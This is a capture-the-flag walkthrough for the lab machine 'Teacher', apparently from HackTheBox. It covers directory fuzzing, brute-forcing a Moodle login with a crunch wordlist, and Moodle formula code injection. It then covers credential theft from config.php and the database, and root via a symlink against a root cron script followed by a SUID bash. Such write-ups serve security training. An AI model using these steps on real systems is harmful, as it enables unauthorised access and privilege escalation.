### Scanning process
sudo nmap -p- --open -sCV -n -Pn \<ip\> -oN targeted:

Teacher is a easy difficulty Linux machine. It is an educational portal of a school which use moodle.

What's Moodle?
>**Moodle** is a free and open-source learning management system written in PHP. It's used for blended learning, distance education, flipped classroom and other online learning schemes

To enumerate the main service in port 80 we use `wfuzz`:
``` python
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.153/FUZZ -t 200
```
``` python
000000016:   301        9 L      28 W       313 Ch      "images"
000010825:   403        11 L     32 W       297 Ch      "phpmyadmin"
000014433:   301        9 L      28 W       313 Ch      "moodle"   
```
Taking a look of images path we'll find a suspicious image `5.png` which contains a posible password for user Giovanni, but he cannot remmember the last caracter of his passwod. But we can create a dictionary with the command `crunch`. Firstly, create a file charse.lst. Then use it to generate all possible password:
```
dalpha                     = [abcdefghijklmnopqrstuvwxyz]
ualpha                     = [ABCDEFGHIJKLMNOPQRSTUVWXYZ]
numeric                    = [0123456789]
symbols-all                = [!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
all-alpha-numeric-symbol   = [ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
```
``` python
crunch 15 15 -f charset.lst all-alpha-numeric-symbol -t Th4C00lTheacha@ > password.txt
```

We got a possible credential so maybe there is an access panel... Examine directory moodle which is a redirect to `http://teacher.htb/moodle/`. Adding this new host in our /etc/hosts, we'll follow it. There is a sign-in panel. Use burpsuite to study how is data sent. Then use wfuzz to find the correct password for Giovanni.
``` python
wfuzz -c --hc=404 -w password.txt -u http://teacher.htb//moodle/login/index.php -d "anchor=&username=Giovanni&password=FUZZ" 
```
The password will be valid when the response is different from everyone else. You got it! Now you are Giovanni, the teacher. You are allowed to create all quizz you want.

### Exploit vulnerabilities
You can [inject code](https://blog.sonarsource.com/moodle-remote-code-execution/) in moodle math formulas. This ones are evaluated by moodle dynamically on randomized input variables. It will evaluate it with the function `eval()` of PHP.

Following the inject code tutorial you can create a quizz and get a RCE. You can use it to get an interactive console to work better.

### Migrating of user 
Usually there are config files which have credentials as plain text. Look for one of this file on the domain and check if we can get credentials. Exaclty take a look of `/var/www/html/moodle/config.php`. It has a root password of **mariadb**.

Go to mysql as root and examine all databases to find some other credentials: `mysql -u root -p`. There is an identifier associated with username. Examine it with `hash-identifier` and search in [crackstation](https://crackstation.net/), because it is possible this identifier is in his dictionary. 

### Privilege Scalation
If we look at /home/giovanni directory we can see a folder named `work` which contains backup from courses. This tell us that there is a periodically command executed. Using a procmon or pspy we'll see it:
``` python
2022/07/13 19:16:01 CMD: UID=0    PID=14010  | /bin/bash /usr/bin/backup.sh 
2022/07/13 19:16:01 CMD: UID=0    PID=14011  | tar -xf backup_courses.tar.gz
2022/07/13 19:16:01 CMD: UID=0    PID=14012  | /bin/bash /usr/bin/backup.sh 
```
Take a look of `/usr/bin/backup.sh` script. 
``` python
#!/bin/bash                                   
cd /home/giovanni/work;                       
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;                                       
tar -xf backup_courses.tar.gz;                
chmod 777 * -R;                               
```
As you can see, it is executed by root (UID=0) and it changes persmission of directory `/home/giovanni/work/tmp/*` so if we create a symbol link named test that reference to /usr/bin/backup.sh in this directory we will change permission of backup.sh because it is executed by root:
1. cd /home/giovanni/work/tmp/
2. touch test
3. ln -s -f /usr/bin/backup.sh test
4. (Wait to the periodic task and) Check the permission of backup.share
5. Edit it to change permission of /bin/bash: `chmod u+s /bin/bash`
6. bash -p

 And that's all!
